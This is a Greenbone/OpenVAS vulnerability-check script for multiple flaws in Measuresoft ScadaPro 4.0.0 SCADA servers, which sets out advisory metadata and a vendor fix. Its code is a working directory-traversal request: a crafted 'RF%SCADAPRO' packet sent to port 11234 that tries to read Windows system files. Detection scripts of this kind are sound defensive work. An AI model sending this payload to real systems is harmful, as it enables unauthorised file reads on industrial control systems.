# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802047");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2011-3495", "CVE-2011-3496", "CVE-2011-3497", "CVE-2011-3490");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-12-19 15:53:58 +0530 (Wed, 19 Dec 2012)");
  script_name("Measuresoft ScadaPro Multiple Security Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("General");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports(11234);
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://secunia.com/advisories/45973");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49613");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17848");
  script_xref(name:"URL", value:"http://aluigi.altervista.org/adv/scadapro_1-adv.txt");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICSA-11-263-01.pdf");
  script_xref(name:"URL", value:"http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-04.pdf");
  script_xref(name:"URL", value:"http://www.measuresoft.net/news/post/Reports-of-Measuresoft-ScadaPro-400-Vulnerability-when-Windows-Firewall-is-switched-Off.aspx");
  script_xref(name:"URL", value:"http://www.measuresoft.com/products/scadapro-server/scada-server.aspx");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read, modify, or
  delete arbitrary files and possibly execute arbitrary code.");

  script_tag(name:"affected", value:"Measuresoft ScadaPro 4.0.0 and prior");

  script_tag(name:"insight", value:"Multiple boundary errors within service.exe when processing certain packets.");

  script_tag(name:"solution", value:"Upgrade to Measuresoft ScadaPro 4.0.1 or later.");

  script_tag(name:"summary", value:"Measuresoft ScadaPro SCADA Server is prone to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

port = 11234;
if( ! get_port_state( port ) )
  exit( 0 );

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

trav_str = crap( length:19, data:'\x5c\x2e\x2e' );

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];

  # nb: Workaround as egrep is not matching the response due to non printable characters in the response
  pattern = str_replace( find:"\[", string:file, replace:"[" );
  pattern = str_replace( find:"\]", string:file, replace:"]" );
  pattern = str_replace( find:"supporT", string:file, replace:"support" );

  req = string( 'RF%SCADAPRO', trav_str, file,
                '\x09\x32\x35\x36\x09\x2d\x31\x09\x30\x09\x32\x36\x38\x34\x33',
                '\x35\x34\x35\x36\x09\x33\x09\x30\x09\x34\x09\x30\x09\x30\x00' );

  send( socket:soc, data:req );

  res = recv( socket:soc, length:2048, timeout:20 );

  if( pattern >< res ) {
    close( soc );
    security_message( port:port );
    exit( 0 );
  }
}

close( soc );
exit( 0 );